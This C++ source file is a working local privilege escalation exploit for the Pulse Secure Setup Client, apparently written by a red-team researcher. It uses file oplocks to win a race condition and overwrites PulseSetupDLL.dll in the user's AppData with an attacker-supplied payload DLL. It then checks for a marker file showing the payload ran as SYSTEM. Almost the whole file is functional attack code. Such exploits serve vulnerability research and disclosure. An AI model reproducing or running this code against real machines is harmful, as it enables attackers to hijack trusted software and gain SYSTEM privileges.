#include <windows.h>
#include <winbase.h>
#include <stdlib.h>
#include <stdio.h>
#include <tchar.h>
#include <strsafe.h>
#include <pathcch.h>
#include <Shlwapi.h>
#pragma comment(lib, "Pathcch.lib")
#pragma comment(lib, "Shlwapi.lib")
#include "FileOpLock.h" 
#include "stdafx.h"


// This is Pulse Secure Setup Client race condition LPE exploit.
// Developed by Julian Horoszkiewicz (Eviden Red Team).
// Code based on https://learn.microsoft.com/en-us/windows/win32/fileio/obtaining-directory-change-notifications
// and https://learn.microsoft.com/en-us/windows/win32/fileio/listing-the-files-in-a-directory, 
// FileOplock code taken from Google's https://github.com/googleprojectzero/symboliclink-testing-tools

void backup_original(LPSTR);
void deploy_payload(LPTSTR);
void handle_oplock();
void set_oplock();
void watch_for_poc();
void deploy_payload();

HANDLE hFind = INVALID_HANDLE_VALUE;
HANDLE h_toRename = INVALID_HANDLE_VALUE;
TCHAR LOCALAPPDATA[MAX_PATH];
TCHAR PULSE_TEMP_DIRNAME[MAX_PATH];

TCHAR PAYLOAD_DLL_PATH[MAX_PATH];
TCHAR DLL_PATH[MAX_PATH];
TCHAR DLL_COPY_PATH[MAX_PATH];
TCHAR DLL_MOVED1_PATH[MAX_PATH];
TCHAR DLL_MOVED2_PATH[MAX_PATH];
TCHAR CURRENT_DIR[MAX_PATH];
TCHAR POC_PATH[MAX_PATH];

WIN32_FIND_DATA ffd;
DWORD dwError = 0;
// Find the first file in the directory.
TCHAR FIRST_TEMP_FILENAME[MAX_PATH];
TCHAR FIRST_TEMP_FILEMASK[MAX_PATH];
TCHAR TEMP_NAME_BASE[7];
char* DLL_BUFFER;
size_t DLL_BUFF_LENGTH = 0;
int MAX_SCAN_FAILS = 20;
static FileOpLock* oplock = nullptr;

int set_oplock(LPCWSTR target, LPCWSTR share_mode) // share modes: r - FILE_SHARE_READ, w - FILE_SHARE_WRITE, d - FILE_SHARE_DELETE, x - Exclusive lock
{
    oplock = FileOpLock::CreateLock(target, share_mode, handle_oplock);
    if (oplock != nullptr)
    {
        printf("Oplock set, waiting for release...\n");       
        oplock->WaitForLock(INFINITE);
        delete oplock;
        return 0;
    }
    else
    {
        printf("Error creating oplock\n");
        return 1;
    }
}
void handle_oplock()
{
    printf("OpLock triggered!");    
    printf("Releasing oplock...\n");
}

void _tmain(int argc, TCHAR *argv[])
{
    _tprintf(TEXT("\nObtaining the APPDATA environmental variable...\n\n"));
    GetEnvironmentVariable(TEXT("APPDATA"), LOCALAPPDATA, MAX_PATH); // C:\Users\user\AppData\Local\Temp is what we're looking for    
    StringCchCat(DLL_COPY_PATH, MAX_PATH, LOCALAPPDATA); // backup copy
    StringCchCat(PULSE_TEMP_DIRNAME, MAX_PATH, LOCALAPPDATA);
    StringCchCat(PULSE_TEMP_DIRNAME, MAX_PATH, TEXT("\\Pulse Secure\\Setup Client"));
    StringCchCat(DLL_PATH, MAX_PATH, PULSE_TEMP_DIRNAME);
    StringCchCat(POC_PATH, MAX_PATH, TEXT("C:\\Users\\Public\\poc.txt")); // poc.txt expected to be created upon successful DLL hijack
    StringCchCat(DLL_PATH, MAX_PATH, TEXT("\\PulseSetupDLL.dll")); // PulseSetupDLL.dll, original
    StringCchCat(DLL_COPY_PATH, MAX_PATH, TEXT("\\PulseSetupDLL.bak.dll")); // 

    _tprintf(TEXT("\nDone. Filenames generated.\n%s\n%s\n%s\n%s\n%s\n"), PULSE_TEMP_DIRNAME, DLL_PATH, DLL_COPY_PATH, DLL_MOVED1_PATH, DLL_MOVED2_PATH);

    if (PathFileExists(POC_PATH))
    {
        _tprintf(TEXT("Detected old %s, removing."), POC_PATH);
        DeleteFile(POC_PATH);
    }
    // Restore the original file if previously exploited
    _tprintf(TEXT("Running backup and cleanup..."));

    // Backup the original file if not backed up already
    if (!PathFileExists(DLL_COPY_PATH)) 
    {   
        if (!PathFileExists(DLL_PATH))
        {
            _tprintf(TEXT("%s backup did not exist, and neither does %s - you need to restore PulseSetupDLL.dll from somewhere (MD5: ab4f0e3387f1e2971b616d926603d7f8, try VT!). Exiting.\n"), DLL_COPY_PATH, DLL_PATH);
            ExitProcess(1);
        }
        else
        {
            _tprintf(TEXT("%s backup did not exist, creating...\n"), DLL_COPY_PATH);
            CopyFile(DLL_PATH, DLL_COPY_PATH, FALSE);
        }
    }
    else
    {
        _tprintf(TEXT("%s backup exists.\n"), DLL_COPY_PATH);
        if (!PathFileExists(DLL_PATH))
        {
            _tprintf(TEXT("%s does not exist, restroting from %s...\n"), DLL_PATH, DLL_COPY_PATH);
            CopyFile(DLL_COPY_PATH, DLL_PATH, FALSE);
        }
    }

    _tprintf(TEXT("\nPress any key to start TOCTOU exploitation, then trigger the Setup Client by connecting to a proper instance of Pulse Secure Gateway."));
    char g;
    getc(stdin);

    // OK, load the payload DLL now
    size_t path_len = 0;
    GetModuleFileName(NULL, CURRENT_DIR, MAX_PATH);
    StringCchLengthW(CURRENT_DIR, MAX_PATH, &path_len);
    PathCchRemoveFileSpec(CURRENT_DIR, path_len);
    StringCchCat(PAYLOAD_DLL_PATH, MAX_PATH, CURRENT_DIR);
    StringCchCat(PAYLOAD_DLL_PATH, MAX_PATH, TEXT("\\raw.dll"));

    // Open the binary file
    HANDLE fileHandle = CreateFile(PAYLOAD_DLL_PATH, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fileHandle == INVALID_HANDLE_VALUE) {
        _tprintf(TEXT("\nFailed to open our DLL file for reading!"));
        return;
    }
    // Get the file size
    DLL_BUFF_LENGTH = GetFileSize(fileHandle, NULL);
    // Read the file contents into a buffer
    DLL_BUFFER = new char[DLL_BUFF_LENGTH];
    DWORD bytesRead;
    if (!ReadFile(fileHandle, DLL_BUFFER, DLL_BUFF_LENGTH, &bytesRead, NULL)) {
        _tprintf(TEXT("\nFailed to read the payload DLL file!"));
        delete[] DLL_BUFFER;
        CloseHandle(fileHandle);
        return;
    }
    _tprintf(TEXT("Done (%d bytes of DLL file read, file size and DLL_BUFFER size: %d).\n Starting to watch for directory changes.\n"), bytesRead, DLL_BUFF_LENGTH);

	// set and handle three oplocks; one after another
    set_oplock(DLL_PATH, TEXT("w")); // first read oplock
    set_oplock(DLL_PATH, TEXT("w")); // second read oplock
    set_oplock(DLL_PATH, TEXT("w")); // third read oplock
    // OK, we need this third oplock in a loop with up to 10 attempts
    while (set_oplock(DLL_PATH, TEXT("w")) == 1);
    // and then deploy_payload(); (overwrite the DLL)
    deploy_payload();
    watch_for_poc();
}
void deploy_payload() // deploy our payload into PulseSetupDLL.dll
{  
    int WRITE_ATTEMPTS = 0;
    int delay_printf = 0;
    while (WRITE_ATTEMPTS < 50)
    {
        HANDLE outFile = CreateFile(DLL_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);        
        WRITE_ATTEMPTS++;
        if (outFile == INVALID_HANDLE_VALUE)
        {
            _tprintf(TEXT("Failed to overwrite the %s file (%d attempt)!\n"), DLL_PATH, WRITE_ATTEMPTS);
            continue;
        }
        // Write binary data to the file
        DWORD bytesWritten;
        if (!WriteFile(outFile, DLL_BUFFER, DLL_BUFF_LENGTH, &bytesWritten, NULL))
        {
            _tprintf(TEXT("Failed to write into %s file!"), DLL_PATH);
            CloseHandle(outFile);
            continue;
        }
        else
        {
            CloseHandle(outFile);
            printf("File overwritten (%d bytes written)! Hopefully at the right moment!\n", bytesWritten);
            break;
        }
    }
}
void watch_for_poc()
{
    _tprintf(TEXT("Will wait for %s for 8 s before checking if our DLL loaded.\n"), POC_PATH);
    Sleep(8000);
    printf("Restoring the original DLL...\n");
    if (CopyFile(DLL_COPY_PATH, DLL_PATH, FALSE)) printf("Done.\n"); else printf("Failed.\n");
    if (PathFileExists(POC_PATH))
    {
        printf("\n\n\nGOT SYSTEM BABY!\n\n\n");
    }
}
